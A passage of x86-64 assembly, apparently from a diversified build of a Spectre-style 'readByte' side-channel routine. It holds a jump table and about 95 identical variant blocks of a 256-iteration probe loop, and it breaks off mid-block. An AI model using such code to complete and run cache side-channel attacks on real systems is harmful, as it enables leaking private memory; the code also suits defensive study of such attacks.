	cmpl	$37, %eax
	je	.LreadByte_win4_var37
	cmpl	$38, %eax
	je	.LreadByte_win4_var38
	cmpl	$39, %eax
	je	.LreadByte_win4_var39
	cmpl	$40, %eax
	je	.LreadByte_win4_var40
	cmpl	$41, %eax
	je	.LreadByte_win4_var41
	cmpl	$42, %eax
	je	.LreadByte_win4_var42
	cmpl	$43, %eax
	je	.LreadByte_win4_var43
	cmpl	$44, %eax
	je	.LreadByte_win4_var44
	cmpl	$45, %eax
	je	.LreadByte_win4_var45
	cmpl	$46, %eax
	je	.LreadByte_win4_var46
	cmpl	$47, %eax
	je	.LreadByte_win4_var47
	cmpl	$48, %eax
	je	.LreadByte_win4_var48
	cmpl	$49, %eax
	je	.LreadByte_win4_var49
	cmpl	$50, %eax
	je	.LreadByte_win4_var50
	cmpl	$51, %eax
	je	.LreadByte_win4_var51
	cmpl	$52, %eax
	je	.LreadByte_win4_var52
	cmpl	$53, %eax
	je	.LreadByte_win4_var53
	cmpl	$54, %eax
	je	.LreadByte_win4_var54
	cmpl	$55, %eax
	je	.LreadByte_win4_var55
	cmpl	$56, %eax
	je	.LreadByte_win4_var56
	cmpl	$57, %eax
	je	.LreadByte_win4_var57
	cmpl	$58, %eax
	je	.LreadByte_win4_var58
	cmpl	$59, %eax
	je	.LreadByte_win4_var59
	cmpl	$60, %eax
	je	.LreadByte_win4_var60
	cmpl	$61, %eax
	je	.LreadByte_win4_var61
	cmpl	$62, %eax
	je	.LreadByte_win4_var62
	cmpl	$63, %eax
	je	.LreadByte_win4_var63
	cmpl	$64, %eax
	je	.LreadByte_win4_var64
	cmpl	$65, %eax
	je	.LreadByte_win4_var65
	cmpl	$66, %eax
	je	.LreadByte_win4_var66
	cmpl	$67, %eax
	je	.LreadByte_win4_var67
	cmpl	$68, %eax
	je	.LreadByte_win4_var68
	cmpl	$69, %eax
	je	.LreadByte_win4_var69
	cmpl	$70, %eax
	je	.LreadByte_win4_var70
	cmpl	$71, %eax
	je	.LreadByte_win4_var71
	cmpl	$72, %eax
	je	.LreadByte_win4_var72
	cmpl	$73, %eax
	je	.LreadByte_win4_var73
	cmpl	$74, %eax
	je	.LreadByte_win4_var74
	cmpl	$75, %eax
	je	.LreadByte_win4_var75
	cmpl	$76, %eax
	je	.LreadByte_win4_var76
	cmpl	$77, %eax
	je	.LreadByte_win4_var77
	cmpl	$78, %eax
	je	.LreadByte_win4_var78
	cmpl	$79, %eax
	je	.LreadByte_win4_var79
	cmpl	$80, %eax
	je	.LreadByte_win4_var80
	cmpl	$81, %eax
	je	.LreadByte_win4_var81
	cmpl	$82, %eax
	je	.LreadByte_win4_var82
	cmpl	$83, %eax
	je	.LreadByte_win4_var83
	cmpl	$84, %eax
	je	.LreadByte_win4_var84
	cmpl	$85, %eax
	je	.LreadByte_win4_var85
	cmpl	$86, %eax
	je	.LreadByte_win4_var86
	cmpl	$87, %eax
	je	.LreadByte_win4_var87
	cmpl	$88, %eax
	je	.LreadByte_win4_var88
	cmpl	$89, %eax
	je	.LreadByte_win4_var89
	cmpl	$90, %eax
	je	.LreadByte_win4_var90
	cmpl	$91, %eax
	je	.LreadByte_win4_var91
	cmpl	$92, %eax
	je	.LreadByte_win4_var92
	cmpl	$93, %eax
	je	.LreadByte_win4_var93
	cmpl	$94, %eax
	je	.LreadByte_win4_var94
	cmpl	$95, %eax
	je	.LreadByte_win4_var95
	cmpl	$96, %eax
	je	.LreadByte_win4_var96
	cmpl	$97, %eax
	je	.LreadByte_win4_var97
	cmpl	$98, %eax
	je	.LreadByte_win4_var98
	cmpl	$99, %eax
	je	.LreadByte_win4_var99
	jmp	.LreadByte_win4_var0
## Variant 0
.LreadByte_win4_var0:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 1
.LreadByte_win4_var1:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 2
.LreadByte_win4_var2:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 3
.LreadByte_win4_var3:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 4
.LreadByte_win4_var4:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 5
.LreadByte_win4_var5:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 6
.LreadByte_win4_var6:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 7
.LreadByte_win4_var7:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 8
.LreadByte_win4_var8:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 9
.LreadByte_win4_var9:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 10
.LreadByte_win4_var10:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 11
.LreadByte_win4_var11:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 12
.LreadByte_win4_var12:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 13
.LreadByte_win4_var13:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 14
.LreadByte_win4_var14:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 15
.LreadByte_win4_var15:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 16
.LreadByte_win4_var16:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 17
.LreadByte_win4_var17:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 18
.LreadByte_win4_var18:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 19
.LreadByte_win4_var19:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 20
.LreadByte_win4_var20:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 21
.LreadByte_win4_var21:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 22
.LreadByte_win4_var22:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 23
.LreadByte_win4_var23:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 24
.LreadByte_win4_var24:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 25
.LreadByte_win4_var25:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 26
.LreadByte_win4_var26:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 27
.LreadByte_win4_var27:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 28
.LreadByte_win4_var28:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 29
.LreadByte_win4_var29:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 30
.LreadByte_win4_var30:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 31
.LreadByte_win4_var31:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 32
.LreadByte_win4_var32:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 33
.LreadByte_win4_var33:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 34
.LreadByte_win4_var34:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 35
.LreadByte_win4_var35:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 36
.LreadByte_win4_var36:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 37
.LreadByte_win4_var37:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 38
.LreadByte_win4_var38:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 39
.LreadByte_win4_var39:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 40
.LreadByte_win4_var40:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 41
.LreadByte_win4_var41:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 42
.LreadByte_win4_var42:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 43
.LreadByte_win4_var43:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 44
.LreadByte_win4_var44:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 45
.LreadByte_win4_var45:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 46
.LreadByte_win4_var46:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 47
.LreadByte_win4_var47:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 48
.LreadByte_win4_var48:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 49
.LreadByte_win4_var49:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 50
.LreadByte_win4_var50:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 51
.LreadByte_win4_var51:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 52
.LreadByte_win4_var52:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 53
.LreadByte_win4_var53:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 54
.LreadByte_win4_var54:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 55
.LreadByte_win4_var55:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 56
.LreadByte_win4_var56:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 57
.LreadByte_win4_var57:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 58
.LreadByte_win4_var58:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 59
.LreadByte_win4_var59:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 60
.LreadByte_win4_var60:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 61
.LreadByte_win4_var61:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 62
.LreadByte_win4_var62:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 63
.LreadByte_win4_var63:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 64
.LreadByte_win4_var64:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 65
.LreadByte_win4_var65:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 66
.LreadByte_win4_var66:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 67
.LreadByte_win4_var67:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 68
.LreadByte_win4_var68:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 69
.LreadByte_win4_var69:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 70
.LreadByte_win4_var70:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 71
.LreadByte_win4_var71:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 72
.LreadByte_win4_var72:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 73
.LreadByte_win4_var73:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 74
.LreadByte_win4_var74:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 75
.LreadByte_win4_var75:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 76
.LreadByte_win4_var76:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 77
.LreadByte_win4_var77:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 78
.LreadByte_win4_var78:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 79
.LreadByte_win4_var79:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 80
.LreadByte_win4_var80:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 81
.LreadByte_win4_var81:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 82
.LreadByte_win4_var82:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 83
.LreadByte_win4_var83:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 84
.LreadByte_win4_var84:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 85
.LreadByte_win4_var85:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 86
.LreadByte_win4_var86:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 87
.LreadByte_win4_var87:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 88
.LreadByte_win4_var88:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 89
.LreadByte_win4_var89:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 90
.LreadByte_win4_var90:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 91
.LreadByte_win4_var91:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 92
.LreadByte_win4_var92:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 93
.LreadByte_win4_var93:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 94
.LreadByte_win4_var94:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
